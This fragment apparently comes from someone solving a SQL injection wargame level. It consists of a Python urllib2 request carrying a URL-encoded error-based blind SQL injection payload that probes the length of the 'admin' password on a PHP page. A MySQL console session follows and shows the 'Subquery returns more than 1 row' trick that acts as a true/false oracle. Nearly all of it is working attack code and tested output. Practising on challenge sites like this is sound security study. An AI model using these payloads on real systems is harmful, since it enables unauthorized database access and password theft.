req = urllib2.Request ("http://localhost/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw=%27%20or%20(id=%27admin%27%20and%20(select%20LENGTH(pw)="+str(i)+"%20union%20select%201))%23")


mysql> select * from member where id='hi' and pass='asdsf' or id='hi' and (select length(pass)<1 union select 1);
ERROR 1242 (21000): Subquery returns more than 1 row
mysql> select * from member where id='hi' and pass='asdsf' or id='hi' and (select length(pass)>1 union select 1);
+----+------+-----+------+
| ID | pass | age | age2 |
+----+------+-----+------+
| hi | hi   |   3 |   44 |
+----+------+-----+------+
1 row in set (0.00 sec)